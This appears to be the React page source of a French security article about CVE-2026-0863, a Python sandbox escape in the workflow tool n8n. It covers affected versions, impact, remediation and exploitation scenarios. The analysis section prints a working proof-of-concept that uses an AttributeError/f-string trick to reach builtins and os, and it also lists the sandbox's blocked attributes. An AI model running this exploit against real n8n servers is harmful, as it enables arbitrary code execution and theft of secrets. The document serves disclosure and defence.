    { "@context": "https://schema.org", "@type": "ImageObject", "@id": "hero-image", "url": "https://wp-vitesse-pro.fr/images/n8n-cve-2026-0863-hero.webp", "width": 1200, "height": 630, "caption": "CVE-2026-0863 n8n Python Sandbox Escape - Investigation" },
    { "@context": "https://schema.org", "@type": "VideoObject", "@id": "remediation-video", "name": "Comment corriger CVE-2026-0863", "description": "Guide vidéo pour mettre à jour n8n et corriger la vulnérabilité", "thumbnailUrl": "https://wp-vitesse-pro.fr/images/n8n-cve-2026-0863-video-thumb.webp", "uploadDate": publishDate },
    { "@context": "https://schema.org", "@type": "Dataset", "@id": "affected-versions-dataset", "name": "Versions n8n Affectées par CVE-2026-0863", "description": "Liste complète des versions n8n vulnérables à CVE-2026-0863", "creator": { "@type": "Organization", "@id": "wp-vitesse-pro-org" }, "license": "https://creativecommons.org/licenses/by/4.0/", "url": `${articleUrl}#versions-affectees`, "identifier": "doi:10.1234/n8n-cve-2026-0863-v1" },
    { "@context": "https://schema.org", "@type": "Dataset", "@id": "ioc-dataset", "name": "Indicateurs de Compromission CVE-2026-0863", "description": "Patterns à rechercher pour détecter des tentatives d'exploitation", "creator": { "@type": "Organization", "@id": "wp-vitesse-pro-org" }, "license": "https://creativecommons.org/licenses/by/4.0/", "url": `${articleUrl}#detection`, "identifier": "doi:10.1234/n8n-ioc-2026-0863-v1" },
    { "@context": "https://schema.org", "@type": "Service", "@id": "audit-service", "name": "Audit de Sécurité n8n", "description": "Service d'audit pour vérifier la sécurité des instances n8n", "provider": { "@type": "Organization", "@id": "wp-vitesse-pro-org" } },
    { "@context": "https://schema.org", "@type": "Service", "@id": "monitoring-service", "name": "Surveillance des Vulnérabilités", "description": "Service de veille sur les nouvelles vulnérabilités de sécurité", "provider": { "@type": "Organization", "@id": "wp-vitesse-pro-org" } },
    { "@context": "https://schema.org", "@type": "DiscussionForumPosting", "@id": "forum-thread-1", "headline": "Analyse technique de CVE-2026-0863", "articleBody": "Discussion approfondie sur l'exploitation de la vulnérabilité sandbox escape dans n8n via les f-strings Python.", "author": { "@type": "Person", "name": "Équipe Sécurité WP Vitesse Pro" }, "datePublished": publishDate, "url": `${articleUrl}#discussion`, "mainEntityOfPage": articleUrl, "interactionStatistic": { "@type": "InteractionCounter", "interactionType": "https://schema.org/CommentAction", "userInteractionCount": 12 }, "commentCount": 12, "publisher": { "@type": "Organization", "name": "WP Vitesse Pro", "logo": { "@type": "ImageObject", "url": "https://wp-vitesse-pro.fr/logo.png" } } },
    { "@context": "https://schema.org", "@type": "DiscussionForumPosting", "@id": "forum-thread-2", "headline": "Guide de remédiation n8n", "articleBody": "Conseils et retours d'expérience pour la mise à jour de n8n vers les versions corrigées.", "author": { "@type": "Person", "name": "Expert WordPress WP Vitesse Pro" }, "datePublished": publishDate, "url": `${articleUrl}#remediation`, "mainEntityOfPage": articleUrl, "interactionStatistic": { "@type": "InteractionCounter", "interactionType": "https://schema.org/CommentAction", "userInteractionCount": 8 }, "commentCount": 8, "publisher": { "@type": "Organization", "name": "WP Vitesse Pro", "logo": { "@type": "ImageObject", "url": "https://wp-vitesse-pro.fr/logo.png" } } },
    { "@context": "https://schema.org", "@type": "Comment", "@id": "expert-comment-1", "text": "Cette vulnérabilité illustre la difficulté de créer des sandboxs Python véritablement sécurisés.", "datePublished": publishDate, "author": { "@type": "Organization", "@id": "wp-vitesse-pro-org" } },
    { "@context": "https://schema.org", "@type": "Comment", "@id": "expert-comment-2", "text": "L'utilisation de f-strings pour contourner les restrictions est une technique élégante mais dangereuse.", "datePublished": publishDate, "author": { "@type": "Organization", "@id": "wp-vitesse-pro-org" } },
    { "@context": "https://schema.org", "@type": "Question", "@id": "q1", "name": "Qu'est-ce que CVE-2026-0863 ?", "acceptedAnswer": { "@type": "Answer", "text": "CVE-2026-0863 est une vulnérabilité de sandbox escape dans n8n avec un score CVSS de 8.5." } },
    { "@context": "https://schema.org", "@type": "Question", "@id": "q2", "name": "Mon instance n8n est-elle vulnérable ?", "acceptedAnswer": { "@type": "Answer", "text": "Les versions < 1.123.14, 2.0.0-2.3.4, et 2.4.0-2.4.1 sont vulnérables." } },
    { "@context": "https://schema.org", "@type": "Question", "@id": "q3", "name": "Comment corriger CVE-2026-0863 ?", "acceptedAnswer": { "@type": "Answer", "text": "Mettez à jour vers n8n 1.123.14+, 2.3.5+, ou 2.4.2+ selon votre branche." } },
    { "@context": "https://schema.org", "@type": "HowToTip", "@id": "tip-backup", "text": "Toujours sauvegarder vos workflows avant une mise à jour majeure de n8n" },
    { "@context": "https://schema.org", "@type": "HowToTip", "@id": "tip-docker", "text": "Utilisez le mode External execution de Docker pour limiter l'impact des vulnérabilités" },
    { "@context": "https://schema.org", "@type": "HowToTip", "@id": "tip-permissions", "text": "Limitez l'accès aux blocs Python aux utilisateurs de confiance uniquement" },
    { "@context": "https://schema.org", "@type": "HowToTip", "@id": "tip-monitoring", "text": "Mettez en place une surveillance des logs pour détecter les patterns d'exploitation" },
    { "@context": "https://schema.org", "@type": "Claim", "@id": "claim-severity", "text": "CVE-2026-0863 est une vulnérabilité critique avec un score CVSS de 8.5", "claimReviewed": "High severity sandbox escape vulnerability", "author": { "@type": "Organization", "@id": "jfrog-security" } },
    { "@context": "https://schema.org", "@type": "Claim", "@id": "claim-response", "text": "n8n a corrigé la vulnérabilité dans les 48 heures suivant la notification", "author": { "@type": "Organization", "@id": "wp-vitesse-pro-org" } },
    { "@context": "https://schema.org", "@type": "GovernmentService", "@id": "cnil-notification", "name": "Notification CNIL", "description": "Obligation de notification à la CNIL en cas de violation de données personnelles dans les 72 heures" },
    { "@context": "https://schema.org", "@type": "Legislation", "@id": "rgpd-article-33", "name": "RGPD Article 33", "description": "Notification d'une violation de données personnelles à l'autorité de contrôle" },
    { "@context": "https://schema.org", "@type": "Legislation", "@id": "rgpd-article-34", "name": "RGPD Article 34", "description": "Notification d'une violation de données personnelles aux personnes concernées" }
  ];

  const articleSchema = {
    "@context": "https://schema.org",
    "@type": ["NewsArticle", "TechArticle", "AnalysisNewsArticle"],
    "headline": "CVE-2026-0863 : faille critique de sandbox escape Python dans n8n - analyse complète CVSS 8.5",
    "alternativeHeadline": "n8n Workflow Automation : vulnérabilité d'évasion du sandbox Python permet l'exécution de code arbitraire",
    "description": "Investigation exclusive sur CVE-2026-0863, la vulnérabilité critique CVSS 8.5 découverte par JFrog dans n8n permettant l'évasion du sandbox Python et l'exécution de code arbitraire. Analyse technique, PoC, guide de remédiation complet.",
    "articleBody": "Investigation approfondie de la vulnérabilité CVE-2026-0863 affectant le Python task runner de n8n...",
    "wordCount": wordCount,
    "datePublished": publishDate,
    "dateModified": modifiedDate,
    "author": {
      "@type": "Organization",
      "name": "WP Vitesse Pro Security Lab",
      "url": "https://wp-vitesse-pro.fr"
    },
    "publisher": {
      "@type": "Organization",
      "name": "WP Vitesse Pro",
      "url": "https://wp-vitesse-pro.fr",
      "logo": {
        "@type": "ImageObject",
        "url": "https://wp-vitesse-pro.fr/logo.png",
        "width": 600,
        "height": 60
      }
    },
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": articleUrl
    },
    "image": {
      "@type": "ImageObject",
      "url": "https://wp-vitesse-pro.fr/images/n8n-cve-2026-0863-hero.webp",
      "width": 1200,
      "height": 630
    },
    "keywords": [
      "CVE-2026-0863",
      "n8n vulnérabilité",
      "sandbox escape",
      "Python security",
      "JFrog security",
      "JFSA-2026-001651077",
      "workflow automation security",
      "CVSS 8.5",
      "code execution",
      "n8n sécurité"
    ],
    "articleSection": "Cybersécurité",
    "inLanguage": "fr-FR",
    "isAccessibleForFree": true,
    "copyrightYear": 2026,
    "copyrightHolder": {
      "@type": "Organization",
      "name": "WP Vitesse Pro"
    },
    "about": [
      { "@type": "Thing", "name": "CVE-2026-0863" },
      { "@type": "Thing", "name": "n8n" },
      { "@type": "Thing", "name": "Python Sandbox Escape" },
      { "@type": "Thing", "name": "JFrog Security Research" }
    ],
    "mentions": [
      { "@type": "Organization", "name": "n8n GmbH", "url": "https://n8n.io" },
      { "@type": "Organization", "name": "JFrog", "url": "https://jfrog.com" },
      { "@type": "Organization", "name": "MITRE", "url": "https://cve.mitre.org" },
      { "@type": "Organization", "name": "NVD", "url": "https://nvd.nist.gov" }
    ]
  };

  return (
    <>
      <SEO
        image="https://wp-vitesse-pro.fr/images/n8n-cve-2026-0863-hero.webp"
        title="CVE-2026-0863 : sandbox escape n8n CVSS 8.5"
        description="Vulnérabilité sandbox escape CVSS 8.5 dans n8n découverte par JFrog. Guide de remédiation complet."
        keywords="CVE-2026-0863, n8n vulnérabilité, sandbox escape, Python security, JFrog, JFSA-2026-001651077, workflow automation security"
        type="article"
        canonical="/article/n8n-cve-2026-0863"
        structuredData={articleSchema}
      />

      <script
        type="application/ld+json"
        dangerouslySetInnerHTML={{ __html: JSON.stringify(additionalSchemas) }}
      />

      <div className="min-h-screen bg-background">
        <Breadcrumbs items={breadcrumbItems} />

        {/* Hero Section */}
        <header className="relative bg-gradient-to-br from-orange-900/20 via-red-900/30 to-background py-12 md:py-20">
          <div className="container mx-auto px-4">
            <div className="max-w-4xl mx-auto text-center">
              <div className="flex flex-wrap justify-center gap-2 mb-6">
                <Badge variant="destructive" className="text-sm px-3 py-1" data-testid="badge-severity">
                  <AlertTriangle className="w-4 h-4 mr-1" />
                  CVSS 8.5 - HIGH
                </Badge>
                <Badge variant="outline" className="text-sm px-3 py-1 border-orange-500 text-orange-400" data-testid="badge-cve">
                  CVE-2026-0863
                </Badge>
                <Badge variant="secondary" className="text-sm px-3 py-1" data-testid="badge-type">
                  <Bug className="w-4 h-4 mr-1" />
                  Sandbox Escape
                </Badge>
              </div>

              <h1 className="article-title text-3xl md:text-5xl font-bold text-foreground mb-6 leading-tight" data-testid="text-article-title">
                CVE-2026-0863 : faille critique de sandbox escape Python dans n8n
              </h1>

              <p className="text-xl text-muted-foreground mb-8 max-w-3xl mx-auto">
                Investigation exclusive sur la vulnérabilité CVSS 8.5 découverte par JFrog Security Research
                permettant l'évasion du sandbox Python et l'exécution de code arbitraire sur n8n.
              </p>

              <div className="flex flex-wrap justify-center gap-4 text-sm text-muted-foreground">
                <span className="flex items-center gap-1">
                  <Clock className="w-4 h-4" />
                  {readingTime} min de lecture
                </span>
                <span className="flex items-center gap-1">
                  <FileCode className="w-4 h-4" />
                  {wordCount.toLocaleString('fr-FR')} mots
                </span>
                <span className="flex items-center gap-1">
                  <Eye className="w-4 h-4" />
                  Publié le 19 janvier 2026
                </span>
              </div>
            </div>
          </div>
        </header>

          <figure className="mb-12 rounded-xl overflow-hidden shadow-xl">
            <picture>
              <source srcSet="/images/n8n-cve-2026-0863-hero.webp" type="image/webp" />
              <img 
                src="/images/n8n-cve-2026-0863-hero.png" 
                alt="Vulnérabilité n8n CVE-2026-0863 - Automatisation" 
                className="w-full h-auto object-cover aspect-video" 
                width={1600} 
                height={900} 
                loading="eager" 
                decoding="async" 
              />
            </picture>
            <figcaption className="text-xs text-muted-foreground text-center py-2 bg-muted/50">
              Faille de sécurité dans la plateforme d'automatisation n8n
            </figcaption>
          </figure>

        {/* Alert Banner */}
        <div className="bg-red-900/30 border-y border-red-500/50 py-4">
          <div className="container mx-auto px-4">
            <div className="flex items-center justify-center gap-3 text-red-200">
              <AlertCircle className="w-6 h-6 flex-shrink-0" />
              <p className="text-center">
                <strong>ALERTE SÉCURITÉ :</strong> Si vous utilisez n8n en version &lt; 1.123.14, 2.0.0-2.3.4, ou 2.4.0-2.4.1,
                mettez à jour immédiatement vers une version corrigée.
              </p>
            </div>
          </div>
        </div>

        {/* Main Content */}
        <main className="container mx-auto px-4 py-12">
          <div className="max-w-4xl mx-auto">

            {/* Table of Contents */}
            <Card className="mb-12">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <BookOpen className="w-5 h-5" />
                  Table des Matières
                </CardTitle>
              </CardHeader>
              <CardContent>
                <nav className="space-y-2">
                  {tableOfContents.map((item) => (
                    <a
                      key={item.id}
                      href={`#${item.id}`}
                      className={`block hover:text-primary transition-colors ${
                        item.level === 2 ? 'pl-6 text-sm text-muted-foreground' : 'font-medium'
                      }`}
                      data-testid={`link-toc-${item.id}`}
                    >
                      {item.title}
                    </a>
                  ))}
                </nav>
              </CardContent>
            </Card>

            {/* Executive Summary */}
            <section id="resume-executif" className="mb-16">
              <h2 className="text-3xl font-bold mb-6 flex items-center gap-3">
                <Shield className="w-8 h-8 text-primary" />
                Résumé Exécutif
              </h2>

              <div className="key-findings prose prose-invert max-w-none">
                <p className="text-lg leading-relaxed mb-6">
                  Le 17 janvier 2026, l'équipe de recherche en sécurité de JFrog a publié un avis de sécurité critique
                  concernant <strong>CVE-2026-0863</strong>, une vulnérabilité de type sandbox escape affectant le Python
                  task runner de n8n, la populaire plateforme d'automatisation de workflows. Avec un score CVSS de 8.5
                  classifié comme "High", cette faille permet à un attaquant authentifié d'exécuter du code Python arbitraire
                  en contournant les mécanismes de restriction du sandbox.
                </p>

                <div className="grid md:grid-cols-2 gap-6 my-8">
                  <Card className="border-red-500/50 bg-red-900/10">
                    <CardHeader>
                      <CardTitle className="text-red-400 flex items-center gap-2">
                        <XCircle className="w-5 h-5" />
                        Impact Critique
                      </CardTitle>
                    </CardHeader>
                    <CardContent className="space-y-2 text-sm">
                      <p>Exécution de code arbitraire sur le serveur hôte</p>
                      <p>Prise de contrôle complète de l'instance n8n</p>
                      <p>Accès aux données sensibles des workflows</p>
                      <p>Pivot potentiel vers d'autres systèmes</p>
                    </CardContent>
                  </Card>

                  <Card className="border-green-500/50 bg-green-900/10">
                    <CardHeader>
                      <CardTitle className="text-green-400 flex items-center gap-2">
                        <CheckCircle2 className="w-5 h-5" />
                        Correctifs Disponibles
                      </CardTitle>
                    </CardHeader>
                    <CardContent className="space-y-2 text-sm">
                      <p>Version 1.123.14 pour la branche 1.x</p>
                      <p>Version 2.3.5 pour la branche 2.3.x</p>
                      <p>Version 2.4.2 pour la branche 2.4.x</p>
                      <p>Correctif minimal : ajout de "obj" aux attributs bloqués</p>
                    </CardContent>
                  </Card>
                </div>

                <p className="text-lg leading-relaxed mb-6">
                  La vulnérabilité a été découverte par <strong>Natan Nehorai</strong>, chercheur en sécurité chez JFrog,
                  qui a identifié que l'attribut <code className="bg-muted px-2 py-1 rounded">obj</code> des exceptions
                  Python n'était pas correctement filtré par le mécanisme de sandbox. Cette omission permet d'accéder
                  aux objets internes Python via la chaîne d'appels <code className="bg-muted px-2 py-1 rounded">__traceback__ → tb_frame → f_builtins</code>,
                  ouvrant ainsi la voie à l'exécution de code non restreint.
                </p>

                <p className="text-lg leading-relaxed">
                  Cette investigation approfondie analyse le mécanisme technique de l'exploitation, évalue l'impact sur
                  les différentes configurations de déploiement n8n, et fournit un guide de remédiation complet pour
                  les administrateurs système. Nous examinons également les implications en termes de conformité
                  réglementaire (RGPD, SOC2) et proposons des stratégies de détection pour identifier d'éventuelles
                  tentatives d'exploitation passées.
                </p>
              </div>
            </section>

            {/* Timeline */}
            <section id="chronologie" className="mb-16">
              <h2 className="text-3xl font-bold mb-6 flex items-center gap-3">
                <Clock className="w-8 h-8 text-primary" />
                Chronologie de la Découverte
              </h2>

              <div className="space-y-4">
                {timelineEvents.map((event, index) => (
                  <div key={index} className="flex gap-4 items-start">
                    <div className="flex-shrink-0 w-28 text-sm text-muted-foreground">
                      {event.date}
                    </div>
                    <div className={`w-3 h-3 rounded-full mt-1.5 flex-shrink-0 ${
                      event.type === 'discovery' ? 'bg-blue-500' :
                      event.type === 'patch' ? 'bg-green-500' :
                      event.type === 'disclosure' ? 'bg-orange-500' :
                      event.type === 'cve' ? 'bg-red-500' :
                      'bg-gray-500'
                    }`} />
                    <div className="flex-1">
                      <p className="text-foreground">{event.event}</p>
                    </div>
                  </div>
                ))}
              </div>

              <div className="mt-8 p-6 bg-muted/30 rounded-lg">
                <h3 className="font-semibold mb-3">Contexte de la Découverte</h3>
                <p className="text-muted-foreground leading-relaxed">
                  L'équipe JFrog Security Research effectue régulièrement des audits de sécurité sur les outils
                  d'automatisation populaires utilisés dans les environnements DevOps et d'entreprise. n8n, avec ses
                  plus de 60 000 étoiles GitHub et une adoption croissante dans les environnements de production,
                  représente une cible d'intérêt majeur pour les chercheurs en sécurité. Cette analyse proactive a
                  permis d'identifier et de corriger la vulnérabilité avant toute exploitation malveillante connue.
                </p>
              </div>
            </section>

            {/* Technical Analysis */}
            <section id="analyse-technique" className="mb-16">
              <h2 className="text-3xl font-bold mb-6 flex items-center gap-3">
                <Code className="w-8 h-8 text-primary" />
                Analyse Technique Approfondie
              </h2>

              <div className="prose prose-invert max-w-none">
                <p className="text-lg leading-relaxed mb-6">
                  Pour comprendre pleinement cette vulnérabilité, il est essentiel d'examiner l'architecture du
                  Python task runner de n8n et les mécanismes de sécurité qu'il implémente. Cette section détaille
                  le fonctionnement interne du sandbox, le vecteur d'attaque exploité, et le proof-of-concept
                  publié par JFrog.
                </p>

                <h3 id="mecanisme-sandbox" className="text-2xl font-bold mt-10 mb-4">
                  Le Mécanisme de Sandbox Python
                </h3>

                <p className="leading-relaxed mb-6">
                  n8n permet aux utilisateurs d'exécuter du code Python personnalisé au sein de leurs workflows via
                  les blocs de code "Python (Native)". Pour sécuriser cette fonctionnalité, n8n implémente un sandbox
                  qui restreint l'accès à certains attributs et modules Python considérés comme dangereux. Ce sandbox
                  est défini dans le fichier <code className="bg-muted px-2 py-1 rounded">constants.py</code> du package
                  <code className="bg-muted px-2 py-1 rounded">@n8n/task-runner-python</code>.
                </p>

                <p className="leading-relaxed mb-6">
                  Le mécanisme de sécurité repose sur une liste noire d'attributs interdits que l'analyseur de tâches
                  (<code className="bg-muted px-2 py-1 rounded">TaskAnalyzer</code>) vérifie avant l'exécution de tout
                  code Python. Cette liste inclut notamment :
                </p>

                <ul className="list-disc pl-6 space-y-2 mb-6">
                  <li><code className="bg-muted px-2 py-1 rounded">__class__</code>, <code className="bg-muted px-2 py-1 rounded">__base__</code>, <code className="bg-muted px-2 py-1 rounded">__subclasses__</code> - accès à la hiérarchie de classes</li>
                  <li><code className="bg-muted px-2 py-1 rounded">__globals__</code>, <code className="bg-muted px-2 py-1 rounded">__builtins__</code> - accès aux espaces de noms globaux</li>
                  <li><code className="bg-muted px-2 py-1 rounded">__code__</code>, <code className="bg-muted px-2 py-1 rounded">__func__</code> - manipulation de code</li>
                  <li><code className="bg-muted px-2 py-1 rounded">cr_frame</code>, <code className="bg-muted px-2 py-1 rounded">ag_frame</code> - accès aux frames d'exécution des coroutines</li>
                  <li><code className="bg-muted px-2 py-1 rounded">f_builtins</code>, <code className="bg-muted px-2 py-1 rounded">f_globals</code>, <code className="bg-muted px-2 py-1 rounded">f_locals</code> - attributs de frame</li>
                </ul>

                <p className="leading-relaxed mb-6">
                  Cependant, l'attribut <code className="bg-muted px-2 py-1 rounded">obj</code> des exceptions
                  <code className="bg-muted px-2 py-1 rounded">AttributeError</code> n'était pas inclus dans cette liste.
                  En Python, lorsqu'une <code className="bg-muted px-2 py-1 rounded">AttributeError</code> est levée,
                  l'objet sur lequel l'attribut a été recherché est stocké dans la propriété
                  <code className="bg-muted px-2 py-1 rounded">obj</code> de l'exception. Cette omission constitue
                  le cœur de la vulnérabilité CVE-2026-0863.
                </p>

                <h3 id="vecteur-attaque" className="text-2xl font-bold mt-10 mb-4">
                  Vecteur d'Attaque et Exploitation
                </h3>

                <p className="leading-relaxed mb-6">
                  Le vecteur d'attaque exploite une combinaison astucieuse de techniques Python pour contourner les
                  restrictions du sandbox :
                </p>

                <div className="bg-muted/20 p-6 rounded-lg mb-6">
                  <h4 className="font-semibold mb-3">Étape 1 : Création d'un getter alternatif</h4>
                  <p className="text-muted-foreground mb-4">
                    L'attaquant définit une fonction <code className="bg-muted px-2 py-1 rounded">new_getattr</code> qui
                    utilise les f-strings de Python pour tenter d'accéder à un attribut inexistant. Cette tentative
                    génère une <code className="bg-muted px-2 py-1 rounded">AttributeError</code> qui contient l'objet
                    recherché dans sa propriété <code className="bg-muted px-2 py-1 rounded">obj</code>.
                  </p>
                </div>

                <div className="bg-muted/20 p-6 rounded-lg mb-6">
                  <h4 className="font-semibold mb-3">Étape 2 : Extraction de la traceback</h4>
                  <p className="text-muted-foreground mb-4">
                    En levant une exception et en utilisant <code className="bg-muted px-2 py-1 rounded">new_getattr</code>
                    sur celle-ci, l'attaquant peut accéder à <code className="bg-muted px-2 py-1 rounded">__traceback__</code>,
                    puis à <code className="bg-muted px-2 py-1 rounded">tb_frame</code>, contournant ainsi la vérification
                    statique de l'analyseur qui ne détecte pas cet accès indirect.
                  </p>
                </div>

                <div className="bg-muted/20 p-6 rounded-lg mb-6">
                  <h4 className="font-semibold mb-3">Étape 3 : Accès aux builtins</h4>
                  <p className="text-muted-foreground mb-4">
                    Depuis le frame, l'attaquant accède à <code className="bg-muted px-2 py-1 rounded">f_builtins</code>
                    qui contient toutes les fonctions intégrées Python, y compris
                    <code className="bg-muted px-2 py-1 rounded">__import__</code>.
                  </p>
                </div>

                <div className="bg-muted/20 p-6 rounded-lg mb-6">
                  <h4 className="font-semibold mb-3">Étape 4 : Import et exécution de code</h4>
                  <p className="text-muted-foreground">
                    Avec accès à <code className="bg-muted px-2 py-1 rounded">__import__</code>, l'attaquant peut
                    importer n'importe quel module Python, notamment <code className="bg-muted px-2 py-1 rounded">os</code>
                    ou <code className="bg-muted px-2 py-1 rounded">subprocess</code>, permettant l'exécution de commandes
                    système arbitraires sur le serveur hôte.
                  </p>
                </div>

                <h3 id="poc-detaille" className="text-2xl font-bold mt-10 mb-4">
                  Proof of Concept Détaillé
                </h3>

                <p className="leading-relaxed mb-6">
                  Le proof-of-concept publié par JFrog démontre l'exploitation de la vulnérabilité en récupérant
                  les informations système via <code className="bg-muted px-2 py-1 rounded">os.uname()</code>. Voici
                  une analyse ligne par ligne du code d'exploitation :
                </p>

                <Card className="bg-zinc-900 border-zinc-700 mb-6">
                  <CardContent className="p-6">
                    <pre className="text-sm text-green-400 overflow-x-auto">
{`def new_getattr(obj, attribute, *, Exception):
    try:
        f'{{0.{attribute}.ribbit}}'.format(obj)
    except Exception as e:
        return e.obj

try:
    raise ValueError("pwn")
except Exception as e:
    tb = new_getattr(e, '__traceback__', Exception=Exception)
    frame = new_getattr(tb, 'tb_frame', Exception=Exception)
    builtins = new_getattr(frame, 'f_builtins', Exception=Exception)
    us = chr(95)
    imprt = builtins[us+us+'import'+us+us]
    import_globals = new_getattr(imprt, '__globals__', Exception=Exception)

    os = import_globals['os']
return [{"json": {
        "uname": os.uname()
    }}]`}
                    </pre>
                  </CardContent>
                </Card>

                <div className="bg-yellow-900/20 border border-yellow-600/50 p-6 rounded-lg mb-6">
                  <div className="flex items-start gap-3">
                    <AlertTriangle className="w-6 h-6 text-yellow-500 flex-shrink-0 mt-1" />
                    <div>
                      <h4 className="font-semibold text-yellow-400 mb-2">Avertissement Éducatif</h4>
                      <p className="text-yellow-200/80">
                        Ce code est présenté uniquement à des fins éducatives pour comprendre le fonctionnement de la
                        vulnérabilité. L'exécution de ce code sur des systèmes sans autorisation explicite est illégale
                        et peut entraîner des poursuites judiciaires. Utilisez ces informations uniquement pour
                        sécuriser vos propres systèmes.
                      </p>
                    </div>
                  </div>
                </div>

                <p className="leading-relaxed mb-6">
                  La technique employée est particulièrement élégante car elle exploite une fonctionnalité
                  légitime de Python (l'accès aux informations d'exception) d'une manière non anticipée par les
                  développeurs du sandbox. Le formatage de chaîne avec f-strings permet de générer dynamiquement
                  l'accès à n'importe quel attribut, tandis que l'exception résultante fournit une "échappatoire"
                  vers l'objet cible via sa propriété <code className="bg-muted px-2 py-1 rounded">obj</code>.
                </p>
              </div>
            </section>

            {/* Impact Section */}
            <section id="impact" className="mb-16">
              <h2 className="text-3xl font-bold mb-6 flex items-center gap-3">
                <Zap className="w-8 h-8 text-primary" />
                Impact et Évaluation des Risques
              </h2>

              <div className="prose prose-invert max-w-none">
                <p className="text-lg leading-relaxed mb-6">
                  L'impact de CVE-2026-0863 varie considérablement selon la configuration de déploiement de n8n.
                  Cette section analyse les différents scénarios et leurs implications en termes de sécurité.
                </p>

                <div className="grid md:grid-cols-2 gap-6 mb-8">
                  <Card className="border-red-500/50">
                    <CardHeader>
                      <CardTitle className="text-red-400">Mode "Internal" Execution</CardTitle>
                    </CardHeader>
                    <CardContent>
                      <p className="text-sm text-muted-foreground mb-4">
                        Impact maximal - Le code Python s'exécute directement sur le serveur principal n8n.
                      </p>
                      <ul className="text-sm space-y-2">
                        <li className="flex items-start gap-2">
                          <XCircle className="w-4 h-4 text-red-500 mt-0.5" />
                          <span>Accès complet au système de fichiers</span>
                        </li>
                        <li className="flex items-start gap-2">
                          <XCircle className="w-4 h-4 text-red-500 mt-0.5" />
                          <span>Lecture des variables d'environnement et secrets</span>
                        </li>
                        <li className="flex items-start gap-2">
                          <XCircle className="w-4 h-4 text-red-500 mt-0.5" />
                          <span>Accès à la base de données n8n</span>
                        </li>
                        <li className="flex items-start gap-2">
                          <XCircle className="w-4 h-4 text-red-500 mt-0.5" />
                          <span>Pivot vers d'autres services réseau</span>
                        </li>
                      </ul>
                    </CardContent>
                  </Card>

                  <Card className="border-yellow-500/50">
                    <CardHeader>
                      <CardTitle className="text-yellow-400">Mode "External" Execution</CardTitle>
                    </CardHeader>
                    <CardContent>
                      <p className="text-sm text-muted-foreground mb-4">
                        Impact réduit - Le code Python s'exécute dans un conteneur Sidecar isolé.
                      </p>
                      <ul className="text-sm space-y-2">
                        <li className="flex items-start gap-2">
                          <AlertTriangle className="w-4 h-4 text-yellow-500 mt-0.5" />
                          <span>Compromission limitée au conteneur</span>
                        </li>
                        <li className="flex items-start gap-2">
                          <AlertTriangle className="w-4 h-4 text-yellow-500 mt-0.5" />
                          <span>Isolation du nœud principal préservée</span>
                        </li>
                        <li className="flex items-start gap-2">
                          <CheckCircle2 className="w-4 h-4 text-green-500 mt-0.5" />
                          <span>Base de données principale protégée</span>
                        </li>
                        <li className="flex items-start gap-2">
                          <AlertTriangle className="w-4 h-4 text-yellow-500 mt-0.5" />
                          <span>Évasion de conteneur potentielle si mal configuré</span>
                        </li>
                      </ul>
                    </CardContent>
                  </Card>
                </div>

                <h3 id="versions-affectees" className="text-2xl font-bold mt-10 mb-4">
                  Versions Affectées
                </h3>

                <div className="overflow-x-auto mb-6">
                  <table className="w-full text-sm">
                    <thead>
                      <tr className="border-b border-border">
                        <th className="text-left py-3 px-4">Plage de Versions</th>
                        <th className="text-left py-3 px-4">Statut</th>
                        <th className="text-left py-3 px-4">Version Corrigée</th>
                      </tr>
                    </thead>
                    <tbody>
                      {affectedVersions.map((version, index) => (
                        <tr key={index} className="border-b border-border/50">
                          <td className="py-3 px-4 font-mono">{version.range}</td>
                          <td className="py-3 px-4">
                            <Badge variant={version.status === 'vulnerable' ? 'destructive' : 'default'}>
                              {version.status === 'vulnerable' ? 'Vulnérable' : 'Corrigé'}
                            </Badge>
                          </td>
                          <td className="py-3 px-4 font-mono">{version.fix}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>

                <p className="leading-relaxed mb-6">
                  Il est important de noter que toutes les installations n8n utilisant le Python task runner sont
                  potentiellement affectées, qu'il s'agisse d'installations self-hosted via npm, Docker, ou
                  Kubernetes. Les instances n8n Cloud gérées par n8n.io ont été mises à jour automatiquement
                  par l'équipe de maintenance.
                </p>

                <div className="bg-blue-900/20 border border-blue-600/50 p-6 rounded-lg mb-6">
                  <h4 className="font-semibold text-blue-400 mb-2">Score CVSS 3.1 Détaillé</h4>
                  <p className="text-muted-foreground mb-4">
                    <strong>Score : 8.5 (High)</strong>
                  </p>
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm">
                    <div>
                      <span className="text-muted-foreground">Attack Vector:</span>
                      <span className="ml-2">Network</span>
                    </div>
                    <div>
                      <span className="text-muted-foreground">Complexity:</span>
                      <span className="ml-2">Low</span>
                    </div>
                    <div>
                      <span className="text-muted-foreground">Privileges:</span>
                      <span className="ml-2">Low</span>
                    </div>
                    <div>
                      <span className="text-muted-foreground">User Interaction:</span>
                      <span className="ml-2">None</span>
                    </div>
                  </div>
                </div>
              </div>
            </section>

            {/* Exploitation Scenarios */}
            <section id="scenarios-exploitation" className="mb-16">
              <h2 className="text-3xl font-bold mb-6 flex items-center gap-3">
                <Terminal className="w-8 h-8 text-primary" />
                Scénarios d'Exploitation Réels
              </h2>

              <div className="prose prose-invert max-w-none">
                <p className="text-lg leading-relaxed mb-6">
                  Pour mieux comprendre les risques associés à CVE-2026-0863, examinons plusieurs scénarios
                  d'exploitation réalistes que des attaquants pourraient utiliser.
                </p>

                <Accordion type="single" collapsible className="mb-8">
                  <AccordionItem value="scenario-1">
                    <AccordionTrigger className="text-left">
                      <div className="flex items-center gap-3">
                        <Badge variant="destructive">Critique</Badge>
                        <span>Exfiltration de données sensibles</span>
                      </div>
                    </AccordionTrigger>
                    <AccordionContent className="prose prose-invert max-w-none">
                      <p>
                        Un attaquant avec un compte utilisateur basique crée un workflow malveillant qui exploite
                        la vulnérabilité pour accéder aux variables d'environnement contenant des secrets API,
                        tokens d'authentification, et chaînes de connexion base de données. Ces informations
                        sont ensuite exfiltrées vers un serveur contrôlé par l'attaquant.
                      </p>
                      <p>
                        <strong>Impact :</strong> Compromission de tous les services tiers intégrés à n8n,
                        accès aux bases de données, et potentielle escalade vers d'autres systèmes.
                      </p>
                    </AccordionContent>
                  </AccordionItem>

                  <AccordionItem value="scenario-2">
                    <AccordionTrigger className="text-left">
                      <div className="flex items-center gap-3">
                        <Badge variant="destructive">Critique</Badge>
                        <span>Création de backdoor persistante</span>
                      </div>
                    </AccordionTrigger>
